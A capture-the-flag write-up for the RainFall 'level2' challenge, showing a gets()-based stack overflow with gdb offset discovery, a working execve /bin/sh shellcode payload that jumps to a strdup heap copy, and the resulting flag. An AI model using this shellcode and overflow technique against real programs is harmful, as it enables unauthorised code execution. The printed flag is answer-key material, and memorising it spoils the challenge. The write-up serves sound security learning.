# Level2

When we take a look at the [decom](./level2_decomp.c), we notice the use of `gets()` a line to check if an address is located in the `0xb0000000` range.
We can also see a call to `strdup()`.

## Exploit

We will first need to find the size of our buffer, to do that, we fill it with characters until it behaves weirdly:

```bash
level2@RainFall:~$ ./level2 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnoooopppp
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppJ����
```

Here we can notice that the buffer is 64 chars long. Nice we found one of the components!

So we need to find the return address and where it is located compared to our buffer. To do that we will use the same technique we used to find the size of our buffer such as:

```bash
level2@RainFall:~$ gdb level2 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) b *p+30
Breakpoint 1 at 0x80484f2
(gdb) r
Starting program: /home/user/level2/level2 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuu

Breakpoint 1, 0x080484f2 in p ()
(gdb) x/s $ebp+4
0xbffff72c:	 "uuuu"
(gdb) 
```

Now we can calculate the difference of size which is : `qqqqrrrrssssttttuuuu` or 16 bytes before overflowing on the return address.

Now that we have the size of everything, we can craft our payload which will be :

`[shellcode] + [59 filler] + [strdup allocated addr]`

It will jump to our shellcode, execute it and voilà !

Here's the exploit:

```bash
level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08"' > /var/crash/tmp.txt
level2@RainFall:~$ cat /var/crash/tmp.txt - | ./level2 
j
 X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Flag

492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

